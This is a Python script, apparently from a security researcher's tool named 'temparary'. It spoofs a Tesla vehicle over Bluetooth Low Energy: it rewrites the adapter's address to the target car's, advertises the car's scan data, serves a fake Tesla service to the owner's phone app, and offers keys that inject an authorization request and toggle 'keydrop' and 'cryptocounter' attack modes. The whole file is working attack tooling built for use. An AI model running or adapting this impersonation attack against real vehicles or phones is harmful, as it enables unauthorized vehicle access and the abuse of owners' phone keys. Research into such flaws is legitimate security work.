#!/usr/bin/env python3

import json
import time
from pybleno import *
import sys
import signal
from Tesla import *
from TeslaService import *
import pyfiglet
import subprocess

__author__ = "Martin Herfurt (trifinite.org)"
__version__ = "0.1.3"
__license__ = "MIT"

BDADDR_BIN='/usr/local/src/bluez-5.64/tools/bdaddr'
HCICONFIG_BIN='/usr/local/bin/hciconfig'
ascii_banner = pyfiglet.figlet_format("temparary")
print(ascii_banner)
print("Author:  "+__author__)
print("Version: "+__version__+"\n")

configfile=''
try:
    configfile = sys.argv[1]
except:
    configfile=''

if (len(configfile)<4):
    print("No config file. Exiting")
    exit(0)

config = {}

with open(configfile, 'r') as f:
    config = json.load(f)

# change adapter address
subprocess.run([BDADDR_BIN, "-t", "-r",config['vehicleBluetoothAddress']])
time.sleep(2.0)
subprocess.run(['hciconfig', "hci0", "up"])
time.sleep(1.0)

bleno = Bleno()
#name = 'S0f7885c2af1a6ef9C'
#vehicleUuid = "74278BDAB64445208F0C720EAF059935"
tesla = Tesla(config)
teslaService = TeslaService(tesla)
eir = bytearray.fromhex(config['scanExtendedInquiryResponse']) 
scanResponse = bytearray.fromhex(config['scanResponse'])


def onStateChange(state):
    if (state == 'poweredOn'):
        def on_startAdvertising(err):
            if err:
                print(err)
        bleno.startAdvertisingWithEIRData(eir, scanResponse, on_startAdvertising)
    else:
        bleno.stopAdvertising();
bleno.on('stateChange', onStateChange)

def onTest(state):
    print("Service added")

def onAccept(state):
    print("Connect from:    "+str(state))

def onDisconnect(state):
    print("Disconnect from: "+str(state))
    
def onAdvertisingStart(error):
    if not error:
        print('advertising...')
        bleno.setServices([
            teslaService
        ])

bleno.on('advertisingStart', onAdvertisingStart)
bleno.on('disconnect', onDisconnect)
bleno.on('accept', onAccept)
bleno.on('servicesSet', onTest)
bleno.start()

inkey =''
print("a : request authorization\nh : toggle human readable output\nk : toggle keydrop attack mode\nc : toggle cryptocounter attack mode\np : toggle phone type between Android and iPhone\nq : terminate")


while (inkey != 'q'):
    if (sys.version_info > (3, 0)):
        ##input()
        inkey = sys.stdin.read(1)
    else:
        raw_input()

    if (inkey == 'a'): # request authorization from Tesla app
        tesla.messagelist.append(bytearray.fromhex('001c1a1a12160a14ffff96c0b80f5a242076ca7bdf9524e1bd78da791802'))

    elif (inkey == 'k'): # toggle evil bit
        tesla.toggleKeydropBit()
        print("KeyDrop attack mode: "+str(tesla.keydrop))

    elif (inkey == 'c'): # toggle sequence bit
        tesla.toggleCryptoCounterBit()
        print("CryptoCounter attack mode: "+str(tesla.cryptocounter))
    
    elif (inkey == 'h'): # toggle human bit
        tesla.toggleHumanBit()
        print("Human readable output: "+str(tesla.human))

    elif (inkey == 'p'): # toggle phone type bit
        tesla.toggleTargetPhoneType()
        if (tesla.targetPhoneType == 0):
            print("Phone type set to: Android")
        else:
            print("Phone type set to: iPhone") 

bleno.stopAdvertising()
bleno.disconnect()

print ('temparary has terminated.')
sys.exit(1)
